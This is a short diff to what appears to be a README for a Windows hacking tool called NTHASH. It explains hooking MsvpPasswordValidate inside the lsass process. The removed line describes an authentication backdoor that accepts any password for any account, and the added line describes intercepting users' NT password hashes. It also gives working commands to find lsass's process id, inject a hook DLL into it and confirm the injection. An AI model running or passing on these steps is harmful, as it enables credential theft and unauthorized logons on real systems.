@@ -1,6 +1,7 @@
-Hook MsvpPasswordValidate, always return 1 and log on with any account (local or remote) and any password.
+Hook MsvpPasswordValidate, and intercept the NT hash of the user's password.
 
 How to proceed:
+
 Lets retrieve the pid of lsass : nthash-win64 /enumproc | findstr lsass
 NTHASH-win64.exe /inject /pid:808 /binary:c:\temp\hook-win64.dll
 optionally, check that our dll as been injected : NTHASH-win64.exe /enummod /pid:808 | findstr hook .
